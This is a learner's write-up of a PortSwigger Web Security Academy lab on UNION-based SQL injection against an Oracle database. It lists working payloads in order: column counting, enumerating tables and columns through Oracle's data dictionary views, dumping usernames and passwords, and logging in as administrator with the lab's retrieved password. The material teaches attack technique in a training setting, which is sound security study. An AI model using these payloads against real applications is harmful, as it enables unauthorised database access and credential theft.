# SQL Injection – Listing Database Contents (Oracle)

## 1. Lab Overview

**Objective:**

This lab contains a SQL injection vulnerability in the product category filter.

The application returns query results in its response, allowing us to use a **UNION attack** to retrieve data from other database tables.

The goal is to:
1. Determine the number of columns.
2. Identify columns that accept text.
3. Retrieve the list of database tables.
4. Find the table containing user credentials.
5. Identify the username and password columns.
6. Retrieve all usernames and passwords.
7. Log in as `administrator`.

---

## 2. Determine the Number of Columns

**Payload:**

```sql
'ORDER+BY+2--
```

**Explanation:**
- `ORDER BY 2` sorts the query results using the second column.
- Testing different numbers helps determine the number of columns.
- The lab solution confirms that the query returns two columns.

**Result:** 2 columns.

---

## 3. Identify Columns That Accept Text

**Payload:**

```sql
'+UNION+SELECT+'abc','def'+FROM+dual--
```

**Explanation:**
- `UNION SELECT` combines the original query with an injected query.
- `'abc'` and `'def'` are text values.
- `FROM dual` uses Oracle's dummy table.
- `--` comments out the remaining SQL statement.

**Result:** Both columns accept text data.

**Important:** `DUAL` is a special Oracle table used when selecting values without querying an ordinary application table.

---

## 4. Retrieve the List of Database Tables

**Payload:**

```sql
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
```

**Explanation:**
- `all_tables` is an Oracle data dictionary view.
- `table_name` retrieves table names.
- `NULL` fills the second column.

**Result:** Found the following credentials table:

```text
USERS_NDIOHP
```

---

## 5. Identify the Columns in the Users Table

**Payload:**

```sql
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_NDIOHP'--
```

**Explanation:**
- `all_tab_columns` contains information about table columns accessible to the current user.
- `column_name` retrieves column names.
- `WHERE` filters the results to the specified table.

**Results:**

| Column | Purpose |
|---|---|
| `USERNAME_WHEOXY` | Stores usernames |
| `PASSWORD_SIRWRV` | Stores passwords |

---

## 6. Retrieve Usernames and Passwords

**Payload:**

```sql
'+UNION+SELECT+USERNAME_WHEOXY,PASSWORD_SIRWRV+FROM+USERS_NDIOHP--
```

**Explanation:**
- `USERNAME_WHEOXY` retrieves usernames.
- `PASSWORD_SIRWRV` retrieves passwords.
- `FROM USERS_NDIOHP` specifies the credentials table.

**Result:**

| Username | Password |
|---|---|
| `administrator` | `gx83cyjl4zcm8hk7mdar` |

---

## 7. Complete the Lab

Use the retrieved credentials to log in.

**Username:**

```text
administrator
```

**Password:**

```text
gx83cyjl4zcm8hk7mdar
```

**Final result:** Retrieved the administrator credentials and used them to log in.

---

## 8. Important Oracle SQL Concepts

| Concept | Purpose |
|---|---|
| `UNION SELECT` | Combines results from two SELECT queries |
| `ORDER BY` | Sorts results and helps determine column count |
| `DUAL` | Oracle's special dummy table |
| `all_tables` | Lists accessible database tables |
| `all_tab_columns` | Lists columns of accessible tables |
| `table_name` | Retrieves a table's name |
| `column_name` | Retrieves a column's name |
| `WHERE` | Filters query results |
| `NULL` | Provides a placeholder value |
| `--` | Comments out the remaining SQL statement |

---

## 9. What I Learned

This lab helped me understand how UNION-based SQL injection can be used to enumerate an Oracle database.

The process follows these steps:

1. Determine the number of columns.
2. Identify columns that accept text.
3. Enumerate database tables using `all_tables`.
4. Identify table columns using `all_tab_columns`.
5. Retrieve usernames and passwords.
6. Use the administrator credentials to log in.

**Key takeaway:** Different database management systems use different metadata views and SQL syntax. For example, Oracle uses `all_tables` and `all_tab_columns`, while PostgreSQL uses `information_schema.tables` and `information_schema.columns`.

---

**Platform:** PortSwigger Web Security Academy  
**Vulnerability:** SQL Injection – UNION-based attack  
**Database:** Oracle  
**Status:** Administrator login completed
